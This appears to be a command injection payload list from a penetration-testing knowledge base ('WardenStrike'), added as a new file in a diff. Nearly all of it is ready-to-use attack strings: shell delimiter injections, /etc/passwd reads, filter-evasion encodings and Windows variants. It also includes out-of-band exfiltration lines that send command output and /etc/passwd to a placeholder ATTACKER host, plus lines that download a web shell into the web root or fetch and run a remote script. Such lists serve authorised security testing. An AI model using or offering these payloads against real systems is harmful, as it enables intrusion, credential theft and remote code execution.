@@ -1,0 +1,135 @@
+# Command Injection Payloads
+# WardenStrike Knowledge Base
+
+# ─── Basic delimiters ───────────────────────────────────────────
+; id
+| id
+|| id
+& id
+&& id
+` id `
+$(id)
+$( id )
+
+# ─── Common targets ──────────────────────────────────────────────
+; cat /etc/passwd
+| cat /etc/passwd
+; whoami
+; uname -a
+; id; hostname; cat /etc/passwd
+; ls -la /
+; env
+; printenv
+; ps aux
+; netstat -an
+; ifconfig
+
+# ─── Bypass filters ──────────────────────────────────────────────
+# Space bypass
+${IFS}cat${IFS}/etc/passwd
+$IFS$()cat$IFS/etc/passwd
+cat<>/etc/passwd
+cat${IFS}/etc/passwd
+cat</etc/passwd
+{cat,/etc/passwd}
+
+# Newline injection
+%0a id
+%0aid
+%0a%0aid
+
+# URL encoded
+%3b id   (;)
+%7c id   (|)
+%26 id   (&)
+%60id%60 (`)
+
+# Double encoding
+%253b id
+
+# Backtick
+`id`
+`whoami`
+`cat /etc/passwd`
+
+# $() expansion
+$(id)
+$(whoami)
+$(cat /etc/passwd)
+$( cat /etc/passwd )
+
+# Hex/octal bypass
+$(printf '\x69\x64')   -> id
+$(printf '\167\150\157\141\155\151')  -> whoami
+
+# Case bypass (case-insensitive shells)
+WhoAmI
+WHOAMI
+
+# Slash bypass
+cat${IFS}/???/??s???
+cat${IFS}/e?c/p?ss?d
+
+# Concatenation bypass
+c'at' /etc/passwd
+c"a"t /etc/passwd
+/bin/c\at /etc/passwd
+
+# ─── Windows ─────────────────────────────────────────────────────
+& whoami
+| whoami
+; whoami
+& net user
+& systeminfo
+& ipconfig /all
+& type c:\windows\win.ini
+%COMSPEC% /c whoami
+cmd /c whoami
+cmd.exe /c whoami
+powershell -Command whoami
+powershell -enc <base64>
+& ping -n 1 ATTACKER
+
+# ─── Blind (time-based) ──────────────────────────────────────────
+; sleep 5
+| sleep 5
+& sleep 5
+; ping -c 5 127.0.0.1
+; timeout 5
+|| ping -c 5 127.0.0.1
+$(sleep 5)
+`sleep 5`
+; sleep${IFS}5
+
+# ─── Blind (OOB) ─────────────────────────────────────────────────
+; nslookup `whoami`.BURP_COLLABORATOR
+; curl http://ATTACKER/$(whoami)
+; wget http://ATTACKER/$(id)
+; curl -d "$(cat /etc/passwd)" http://ATTACKER
+| nslookup `id`.ATTACKER
+
+# ─── Specific contexts ───────────────────────────────────────────
+# PHP exec()
+; id
+\n id
+
+# Python subprocess
+import os; os.system('id')
+
+# Perl system()
+system("id")
+`id`
+
+# Ruby
+`id`
+system("id")
+exec("id")
+
+# NodeJS
+require('child_process').exec('id')
+require('child_process').execSync('id').toString()
+
+# ─── RCE via file upload + injection ─────────────────────────────
+; mv /tmp/shell.php /var/www/html/
+; curl http://ATTACKER/shell.php -o /var/www/html/shell.php
+; wget http://ATTACKER/shell.sh -O /tmp/s && chmod +x /tmp/s && /tmp/s
